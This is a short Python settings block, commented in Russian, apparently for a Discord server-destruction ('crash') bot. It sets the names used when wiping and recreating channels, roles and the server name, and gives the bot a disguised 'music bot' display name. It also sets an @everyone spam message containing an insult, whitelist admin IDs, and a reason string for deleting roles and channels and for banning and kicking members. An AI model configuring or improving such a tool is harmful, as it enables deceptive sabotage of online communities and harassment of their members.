...
# подробные настройки
channelsn = 'crash-by-me' #имя каналов при краше
rolesn = 'Crash By me' #имя ролей при краше
namen = 'Crashed By me' #имя сервера при краше
iconn = 'icon.PNG' # иконка
hooknamen = 'Crashed By me' #имя хуков
botnamen = 'YIP-YAP N MUSIC!'#тип имя бота
inviten = 'https://discord.gg/YxmqM2b9' # тут ссылка на сервак
spamtextn = f'@everyone\nАХАХАХАХХАХ ЕБАТЬ ТЫ ЛОШАРА\n'
admins = [1166304401829404696] # айди админчиков (могут добавлять сервера в вайт лист и менять статус боту), например [123,456,777]
reasonn = 'сервер ебнулся' # причина удаления ролей,каналов, бана и кика участников
